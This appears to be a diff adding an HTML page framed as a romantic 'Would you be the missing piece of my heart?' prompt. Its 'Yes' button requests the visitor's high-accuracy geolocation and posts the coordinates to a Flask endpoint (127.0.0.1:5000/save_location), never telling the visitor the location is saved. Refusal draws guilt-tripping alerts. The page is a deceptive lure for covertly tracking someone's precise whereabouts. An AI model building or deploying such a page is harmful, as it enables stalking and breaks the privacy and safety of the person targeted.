@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>My Heart's Location</title>
+    <style>
+        body {
+            font-family: 'Cursive', Arial, sans-serif;
+            text-align: center;
+            margin-top: 100px;
+            background-color: #ffe6f0;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 20px;
+            cursor: pointer;
+            background-color: #ff66a3;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #ff3385;
+        }
+        #celebration {
+            margin-top: 30px;
+            font-size: 50px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Would you be the missing piece of my heart?</h1>
+    <button onclick="getLocation()">Yes</button>
+    <div id="celebration">❤️ 🌸 ❤️ 🌸 ❤️</div>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(savePosition, showError, { enableHighAccuracy: true });
+            } else {
+                alert("Your browser doesn't support Geolocation.");
+            }
+        }
+
+        function savePosition(position) {
+            const lat = position.coords.latitude.toFixed(6); // More precise
+            const lon = position.coords.longitude.toFixed(6);
+
+            // Save to Flask server via POST request
+            fetch('http://127.0.0.1:5000/save_location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `latitude=${lat}&longitude=${lon}`
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Location saved:', data);
+                document.getElementById("celebration").style.display = "block";
+            })
+            .catch(error => {
+                console.error('Error saving location:', error);
+            });
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("You denied my love... 😔");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("My heart couldn't find its way... 😢");
+                    break;
+                case error.TIMEOUT:
+                    alert("Love waited too long... ⏳💔");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("Something mysterious happened... 🌫️💔");
+                    break;
+            }
+        }
+    </script>
+
+</body>
+</html>
